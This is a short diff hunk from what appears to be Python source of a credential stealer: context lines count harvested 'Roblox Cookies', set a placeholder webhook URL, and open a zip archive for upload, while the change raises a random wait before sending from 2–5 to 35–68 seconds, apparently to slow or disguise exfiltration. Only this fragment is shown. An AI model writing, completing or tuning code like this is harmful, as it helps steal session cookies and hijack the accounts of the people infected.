@@ -651,7 +651,7 @@ Roblox Cookies : {self.stats['total_roblox']}
         try:
             webhook_url = "YOUR_WEBHOOK_URL_HERE"
             
-            delay = random.uniform(2.0, 5.0)
+            delay = random.uniform(35.0, 68.0)
             time.sleep(delay)
             
             with open(zip_path, 'rb') as f:
